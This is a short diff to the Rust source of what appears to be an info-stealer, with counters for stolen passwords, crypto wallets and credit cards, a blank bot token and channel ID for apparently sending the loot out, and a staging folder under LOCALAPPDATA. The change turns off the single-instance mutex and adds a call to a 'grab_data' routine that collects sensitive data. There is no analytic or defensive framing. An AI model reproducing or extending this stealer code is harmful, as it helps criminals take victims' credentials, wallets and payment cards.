@@ -23,7 +23,7 @@ use wmi::{COMLibrary, WMIConnection};
 
 const BOT_TOKEN: &str = "";
 const CHANNEL_ID: i64 = -0;
-const MUTEX: bool = true;
+const MUTEX: bool = false;
 
 static mut PASSWORDS: i64 = 0;
 static mut WALLETS: i64 = 0;
@@ -33,6 +33,10 @@ static mut CREDIT_CARDS: i64 = 0;
 #[tokio::main]
 async fn main() {
     let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();
+
+    other_grabber::sensitive_data::grab_data();
+
+
 
     let string_path: &str = &format!("{}\\logsxc\\", app_data);
     let mutex_file = format!("{}\\dimp.sts", app_data);
